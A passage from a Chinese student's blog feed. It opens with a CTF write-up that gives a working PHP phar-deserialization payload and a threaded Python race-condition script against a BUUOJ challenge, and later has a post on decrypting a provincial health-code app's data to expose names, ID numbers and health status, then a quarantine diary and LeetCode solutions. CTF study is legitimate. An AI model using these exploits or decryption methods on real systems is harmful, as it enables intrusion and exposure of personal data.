class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#php.ini: phar.readonly = Off</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> flag();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();<span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/uploads/head.png&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/edit.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlink</span>():</span></span><br><span class="line">    req.post(url2, data=&#123;<span class="string">&quot;png&quot;</span>:<span class="string">&quot;phar:///var/www/html/uploads/01908b979c3dea9fc658e68ab8c560e4.png&quot;</span>, <span class="string">&quot;flag&quot;</span>:<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">symlink</span>():</span></span><br><span class="line">    req.post(url2, data=&#123;<span class="string">&quot;png&quot;</span>:<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;flag&quot;</span>:<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t1 = threading.Thread(target=unlink, args=())</span><br><span class="line">        t2 = threading.Thread(target=symlink, args=())</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#getflag</span></span><br><span class="line">        flag = req.get(url1).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python exp.py</span><br><span class="line">flag&#123;eea59afa-414d-4045-8d7f-808abc804951&#125;</span><br></pre></td></tr></table></figure><hr /><p>两个题做了五个小时，只能明天打游戏了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了&lt;br /&gt;
说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩&lt;br /&gt;
但是我上一次碰CTF还是去年的省赛…&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Web" scheme="https://yoloyolo.top/tags/Web/"/>
    
    <category term="PHP" scheme="https://yoloyolo.top/tags/PHP/"/>
    
    <category term="POP" scheme="https://yoloyolo.top/tags/POP/"/>
    
    <category term="Unserialize" scheme="https://yoloyolo.top/tags/Unserialize/"/>
    
  </entry>
  
  <entry>
    <title>闽盾杯/黑盾杯 2021 WP</title>
    <link href="https://yoloyolo.top/2021/12/07/MinDunCup-2021/"/>
    <id>https://yoloyolo.top/2021/12/07/MinDunCup-2021/</id>
    <published>2021-12-07T08:16:04.000Z</published>
    <updated>2022-05-14T16:00:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>2/13<br />但是还是觉得自己菜得要死<br /><a href="https://shimo.im/docs/Gt8GCcQ6rQ3vJxh6">福建省第二届“闽盾杯”网络空间安全大赛黑盾赛道WP</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2/13&lt;br /&gt;
但是还是觉得自己菜得要死&lt;br /&gt;
&lt;a href=&quot;https://shimo.im/docs/Gt8GCcQ6rQ3vJxh6&quot;&gt;福建省第二届“闽盾杯”网络空间安全大赛黑盾赛道WP&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Windows" scheme="https://yoloyolo.top/tags/Windows/"/>
    
    <category term="Cyber_Attribution" scheme="https://yoloyolo.top/tags/Cyber-Attribution/"/>
    
  </entry>
  
  <entry>
    <title>X闽健康码分析</title>
    <link href="https://yoloyolo.top/2021/11/15/X-Min-Health-Code/"/>
    <id>https://yoloyolo.top/2021/11/15/X-Min-Health-Code/</id>
    <published>2021-11-16T03:35:58.000Z</published>
    <updated>2022-06-27T18:16:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>属于是白忙活了，但没完全白忙活</p><a id="more"></a><p>起因是某个选修课的老师觉得我这个识别口罩自动开关门的项目太简单了，事实上我也觉得很简单，甚至自动开关门我都想用只一个被驱动的异步电机糊弄过去<br />后来想着加点活，然后想到了去医院体检的时候，医院门口的门禁是识别口罩+扫X闽健康码<br />所以就想着可能X闽健康码的内容应该挺好解析的<br />截图后丢直接微信扫一扫，和我想得一模一样的Base64编码<br />传到电脑上解码的时候蚌埠住了，估计是加密了，格式如下<br />“MZTJKM_” + 236字节Base64编码 + “#|” + 精确到毫秒的Unix时间戳<br />所以就想着去把中间的Base64解出来<br />然后凭着上次且仅一次的三个月前渗透APP的模糊记忆<br />打开jadx，先看看有没有双向认证，很庆幸是&quot;零向认证&quot;<br />搜索关键字&quot;AES&quot;，然后找了半天的密钥<br />换了&quot;CBC&quot;搜索，然后还找到了3DES的算法<br />感觉不对劲了<br />想办法抓手机APP的包，一通瞎摁点出了个请求X闽健康码的HTTP请求，虽说后面再也没摁出来过了<br />然后我拿着HTTP请求的URL回jadx接着搜索，然后浪费了一个小时<br />后来我才想到，这APP就是个壳子罢了<br />二维码的内容实际上还是Server给的<br />而且请求的URL不在APP里面而是在HTML页面里<br />然后开F12看JS去了，属实是有点坐牢<br />看到后面看到了个&quot;decrypt&quot;的字样，感觉有戏<br />跟进之后就是混淆的JS，此时感觉差不多寄了<br />先把JS反混淆一下大概看看<br />然后把混淆的代码丢console里，挨个跑被混淆的解密参数<br />然后从之前X闽健康码HTTP响应的json里扒拉出来data<br />解密之后得到了姓名，身份证号，健康状态，还有二维码的文本形式（没有后面的时间戳，时间戳是js另外加的）等<br />挺有意思都，新生杯密码学压轴就出这个了<br />到头来X闽健康码的内容还是不知道咋解析<br />回头想想去医院扫健康码的过程<br />要么是医院的门禁内置了X闽健康码的解密函数，能进一步提取里面的信息<br />要么那玩意就提取二维码的文本后匹配&quot;^MZTJKM_[0-9a-zA-Z+/=]{236}#|[0-9]{13}$&quot;<br />但是要是有人拿个红码能进去吗，应该不行<br />所以可能扫码有个颜色识别，这个我就不会了</p><hr /><p>后来又分析了下<br />16字节的分组加密，分组加密方式是ECB<br />我一开始以为应该是AES，后来跟老师讨论的时候说这种政府的项目应该是国密SM4之类的<br />根据我的猜测，中间存在一段在固定位置变动的22字节Base64编码，换算下来解码后正好差不多16字节<br />HTTP响应里也有个12字节的response_code会变动,所以这部分一直变动的16字节大概率是对应response_code<br />剩下4字节可以枚举，但是存在5种位置分布的情况<br />差不多(96 ** 4) * 5种可能<br />而且就算枚举出了全部的可能，也没办法通过明文与密文来还原出密钥，爆破16字节的密钥更不可能了，得爆破(256 ** 16) * (96 ** 4) * 5次，能爆破出来(96 ** 4) * 5个密钥，而且其中只有一个是对的<br />除非我有台量子计算机<br />也还有种可能，就是跟省人民政府去谈项目，但是没这个路子<br />总结来说就是，寄</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;属于是白忙活了，但没完全白忙活&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
  <entry>
    <title>蚌埠的一天</title>
    <link href="https://yoloyolo.top/2021/09/17/Unbengable-Day/"/>
    <id>https://yoloyolo.top/2021/09/17/Unbengable-Day/</id>
    <published>2021-09-18T02:31:18.000Z</published>
    <updated>2022-05-14T16:12:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>2021.09.16<br />根据真实事件改编，如有雷同，请务必对号入座</p><a id="more"></a><p>因为疫情的原因，学校改为上网课<br />早八是一节线上实践课，课程主题是物联网安全<br />07:59的闹钟响了<br />连接腾讯会议之后便半睡半醒地听课<br />这个课是第一次上<br />确切来说是从第一周开始，但是第一周的课因为“机房装修”所以“暂时不上”，通知时间是08:32，距离上课时间过去了32分钟<br />第二周的课因为“还没有开始”所以也不上了，通知时间是00:43<br />然后老师开始说有哪些课程方向可以选</p><ol><li>物联网设备隐私检测</li><li>指纹伪造</li><li>浏览器指纹</li><li>隐写</li><li>加密</li><li>取证</li><li>APP隐私检测</li><li>身份伪装</li></ol><p>我寻思了一下<br />我把上学期写得烂尾Beacon隐写改改得了<br />然后就继续半睡半醒地听课了<br />蚌埠住了</p><p>后来一直不知道说啥玩意，他给的参考文档可能涉及内容敏感，所以会发一个加密的压缩包，然后再发一个密码<br />我觉得他有点在脱裤子放屁<br />然后他说让我们不要乱传这些文件，以防止触发审查机制带来不必要的麻烦<br />我寻思你不整点政治敏感监管人员都懒得看你一眼<br />然后发了个四川大学学生被通报用校园网浏览色情网站27次的截图，然后补了一句“每个学校的校园网都有这个审查机制”<br />我不知道他是在威慑我们还是他想说校园网有监管机制<br />我寻思这种东西开个代理不就没这么多事了<br />退一步来讲，学校的校园网弱口令泛滥得不想说了，盗用账号的收益/(成本*风险)比率可以说是要多高有多高了<br />然后说如果触发了审查机制与他无关<br />我顿时顿悟了，他之前所说一切的可能只是在为这一步做铺垫<br />蚌埠住了</p><p>扯东扯西扯到了九点半就不扯了<br />我能感觉到他之前的内容在尽力地拖时长，可能是因为这节课按照教学计划是要上到11:30<br />但是他真的尽力了，实在不知道扯啥了，所以让我们退出腾讯会议<br />蚌埠住了</p><p>然后我就开始上网冲浪<br />某女纪委被人爆出打女拳&amp;非法获利<br />八小时后就出了自检通告<br />自罚三杯不了了之<br />热心网友向督导组邮想投递邮件叙述情况被拒收<br />反而N**游戏社区接到电话被警告<br />“总不能什么都查吧，没准会查出什么来呢”<br />互联网真的太精彩辣<br />蚌埠住了</p><p>我上网冲浪完后室友回来说辅导员叫我去隔离<br />我问真的假的<br />他说真的<br />为什么要隔离呢<br />因为部门那边有个同事跟一个确诊的坐高铁同一排上<br />然后上周四部门吃饭博饼<br />我也不知道那个同事是谁，当时饭局的二十几桌<br />可能我在这头，他在那头<br />然后我就被算是次密接了<br />一桌的还在上班，不一桌的已经准备隔离了<br />蚌埠住了</p><p>辅导员在哪呢<br />疫情爆发的当晚就回同安看老婆去了<br />其他老师说让他住寝室，但是拉都拉不住<br />可能是因为到了第二天封校了<br />然后可能他那天就在家里跟我们开年级大会<br />强调我们学校不是封校，是非必要不外出<br />这已经是我第二次听了<br />然后过两天同安就封了<br />辅导员仍然坚持居家办公<br />这种精神我觉得值得我们学习<br />蚌埠住了</p><p>然后我就开始收拾东西准备隔离了<br />拉着行李箱去找楼管办外出手续<br />她问我干嘛<br />我说隔离<br />她摆在桌上的双臂下意识得往回收了下<br />填完手续就提着行李去隔离了<br />蚌埠住了</p><p>我们当天一共去了五个人吃饭，所以五个人一起隔离<br />我对辅导员得知公司那边的消息延迟持有怀疑态度<br />如果真是公司有跟学校沟通就不会疫情爆发了三天再叫我们去隔离<br />然后我们开始查内鬼<br />然后就内鬼自爆了<br />因为她的舍友一直叫她跟辅导员自爆<br />然后她今天就去跟辅导员自爆了<br />然后我们都被拉过来隔离了<br />我觉得她舍友如此为疫情防控着想，她应该也过来隔离，毕竟她算是密接的密接的密接了<br />我寻思核酸都有做过了，给我整得有点不会了<br />蚌埠住了</p><p>然后我们五个人在酒店门口站了十几分钟<br />我们与酒店有一个玻璃门相隔，这头是三十多度的日头，那头是二十六度的空调<br />但是保安不让进，支支吾吾得说要找对接医生<br />送我们隔离的老师就去打电话找对接医生<br />然后开始了经典的踢皮球<br />踢了十分钟就踢完了<br />我们登记之后领了房卡就进去了<br />保安不让我们用电梯<br />然后我们搬着行李走楼梯上了三楼<br />这可能是我一生中唯一一次走楼梯入住酒店了<br />蚌埠住了</p><p>到了房间之后插卡取电<br />我发现取电方式是传统的插卡取电<br />然后我就把我的学生卡插进去了<br />房间没有晾衣服的地方<br />我就把带的垃圾袋系成一根绳子<br />两端绑在阳台扶手跟水管<br />然后我就能晾衣服了<br />我也不知道我要隔离多久<br />可能七天，可能十四天，可能无期<br />反正免费的单间还是挺香的<br />蚌埠住了</p><p>然后我就去上厕所了<br />厕所里摆的是马桶<br />按照习惯，先拿卫生纸擦两遍，然后把纸丢马桶里防止溅水花<br />然后马桶就堵住了<br />可能是这个马桶的口径不太行<br />把水加到八成满还是没用<br />然后我就去打电话问前台能不能帮忙疏通马桶<br />前台支支吾吾得说现在疫情的情况不是很方便<br />然后我问能不能把马桶抽子放在我的门口，我自己抽两下子<br />然后前台支支吾吾得说去问一下<br />我就把之前洗热水壶烧的水倒进马桶<br />然后摁一下冲水，就通了<br />然后门铃响了，一个马桶抽子摆在门口<br />虽然我现在不需要这个马桶抽子<br />但是这个马桶抽子能给我带来无穷无尽的安全感<br />蚌埠住了</p><p>然后我就去洗澡了<br />浴室的玻璃门是透明的，我不知道这样的用意是什么<br />然后玻璃门的导轨有点歪，拉动后会向左边滑动<br />我觉得可能是浴室的地板可能歪得有点离谱了<br />蚌埠住了</p><p>然后有医务人员来做核酸检查<br />然后叫我扫一个二维码预约一下<br />我进入那个小程序的方式有点不对<br />让我选一个预约时间<br />然后小程序里选不了预约时间<br />然后必须要有预约时间才能提交这个预约<br />医务人员看着我弄了三四遍就说要我加他微信<br />叫我自己慢慢玩<br />预约上了把结果发给他<br />但是那个小程序我直接进去是要付费预约的<br />扫他给的码不用付费<br />所以我叫他把码再发一下<br />然后我就预约上了<br />通过控制变量法，我觉得可以证明是他的问题<br />蚌埠住了</p><p>然后我就去订餐群订餐了<br />有口水鸡套餐，红烧肉套餐，稀饭套餐<br />都是学校食堂打包过来的<br />价格都是12块<br />应该都是一荤二素<br />我五点半预约的饭<br />快七点才送到<br />我寻思这属实有点久了<br />然后就开始吃饭了<br />吃完饭我寻思一下发现垃圾袋不够用<br />房间里除了套垃圾桶上的也有没有多余垃圾袋<br />但是总是要丢垃圾的<br />所以我把垃圾丢盒饭的袋子里<br />然后把袋子丢门口了<br />蚌埠住了</p><p>然后我就开始打dota了<br />我在上高的时候跟我一起隔离的室友给我打电话叫我填一个隔离备案记录<br />我说叫他等下<br />我在破第二路高地的时候他又给我打电话了<br />我说马上打完<br />打完之后我去填那个隔离备案记录<br />然后我不知道该怎么填<br />我填得差不多了去问他是不是这样填<br />他说他帮我填好了<br />我说<br />谢谢<br />祝您生活愉快<br />再见<br />蚌埠住了</p><p>然后我后面在选人的时候又有华大的老师来打电话给我说<br />问我是因为什么被隔离的<br />我说次密接<br />他问我有没有接到防疫中心的电话<br />我说没有，是辅导员叫我隔离的<br />然后问了我一堆东西<br />我不是很清楚他要问的东西，而且我不是很想退掉这把dota<br />然后我就把我舍友的名字报给他了，叫他联系我舍友去了<br />然后我就继续dota了<br />然后我就感觉这次隔离可能就是因为有sb在瞎jb搞，是谁我不说<br />然后几个一起隔离的都跟我说可能明天就要解除隔离了<br />属于是白嫖了一个单间的钱<br />蚌埠住了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021.09.16&lt;br /&gt;
根据真实事件改编，如有雷同，请务必对号入座&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode病历表</title>
    <link href="https://yoloyolo.top/2021/09/11/LeetCode/"/>
    <id>https://yoloyolo.top/2021/09/11/LeetCode/</id>
    <published>2021-09-11T06:44:51.000Z</published>
    <updated>2022-06-10T17:47:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>做课程项目的时候发现自己对算法一无所知<br />刷刷题吧</p><a id="more"></a><h1 id="两数之和"><a class="markdownIt-Anchor" href="#两数之和"></a> <a href="https://leetcode-cn.com/problems/two-sum">两数之和</a></h1><p>给定一个整数数组<code>nums</code>和一个整数目标值<code>target</code>，请你在该数组中找出和为目标值<code>target</code>的那两个整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [2,7,11,15], target &#x3D; 9</span><br><span class="line">输出：[0,1]</span><br><span class="line">解释：因为 nums[0] + nums[1] &#x3D;&#x3D; 9 ，返回 [0, 1] 。</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [3,2,4], target &#x3D; 6</span><br><span class="line">输出：[1,2]</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [3,3], target &#x3D; 6</span><br><span class="line">输出：[0,1]</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/two-sum">https://leetcode-cn.com/problems/two-sum</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><p>暴力搜索，没啥好说的</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums: List[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; List[int]:</span></span><br><span class="line">length = <span class="built_in">len</span>(nums)</span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(index1+<span class="number">1</span>, length):</span><br><span class="line"><span class="keyword">if</span> nums[index1] + nums[index2] == target:</span><br><span class="line"><span class="keyword">return</span>([index1, index2])</span><br></pre></td></tr></table></figure><p>后来想了一下，可以从奇偶相加规律的角度进行优化</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mi>d</mi><mi>d</mi><mo>+</mo><mi>O</mi><mi>d</mi><mi>d</mi><mo>=</mo><mi>E</mi><mi>v</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">Odd + Odd = Even</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mi>d</mi><mi>d</mi><mo>+</mo><mi>E</mi><mi>v</mi><mi>e</mi><mi>n</mi><mo>=</mo><mi>O</mi><mi>d</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">Odd + Even = Odd</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mi>v</mi><mi>e</mi><mi>n</mi><mo>+</mo><mi>E</mi><mi>v</mi><mi>e</mi><mi>n</mi><mo>=</mo><mi>E</mi><mi>v</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">Even + Even = Even</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span></span></span></span></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums: List[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; List[int]:</span></span><br><span class="line">odd = []</span><br><span class="line">even = []</span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> nums: <span class="comment"># 奇偶数分类</span></span><br><span class="line"><span class="keyword">if</span> index1 % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">even.append(index1)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">odd.append(index1)</span><br><span class="line">len_odd = <span class="built_in">len</span>(odd)</span><br><span class="line">len_even = <span class="built_in">len</span>(even)</span><br><span class="line"><span class="keyword">if</span> target % <span class="number">2</span> == <span class="number">0</span>: <span class="comment"># 偶数</span></span><br><span class="line"><span class="keyword">if</span> len_odd &gt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(len_odd):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(index1+<span class="number">1</span>, len_odd):</span><br><span class="line"><span class="keyword">if</span> odd[index1] + odd[index2] == target:</span><br><span class="line">idx = nums.index(odd[index1])</span><br><span class="line"><span class="keyword">return</span>([idx, nums.index(odd[index2], idx+<span class="number">1</span>)])</span><br><span class="line"><span class="keyword">if</span> len_even &gt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(len_even):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(index1+<span class="number">1</span>, len_even):</span><br><span class="line"><span class="keyword">if</span> even[index1] + even[index2] == target:</span><br><span class="line">idx = nums.index(even[index1])</span><br><span class="line"><span class="keyword">return</span>([idx, nums.index(even[index2], idx+<span class="number">1</span>)])</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># 奇数</span></span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(len_odd):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(len_even):</span><br><span class="line"><span class="keyword">if</span> odd[index1] + even[index2] == target:</span><br><span class="line"><span class="keyword">return</span>([nums.index(odd[index1]), nums.index(even[index2])])</span><br></pre></td></tr></table></figure><p>执行时间直接降了一半</p><hr /><h1 id="两数相加"><a class="markdownIt-Anchor" href="#两数相加"></a> <a href="https://leetcode-cn.com/problems/add-two-numbers">两数相加</a></h1><p>给你两个<strong>非空</strong>的链表，表示两个非负的整数。它们每位数字都是按照<strong>逆序</strong>的方式存储的，并且每个节点只能存储<strong>一位</strong>数字。</p><p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p><p>你可以假设除了数字0之外，这两个数都不会以0开头。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 &#x3D; [2,4,3], l2 &#x3D; [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 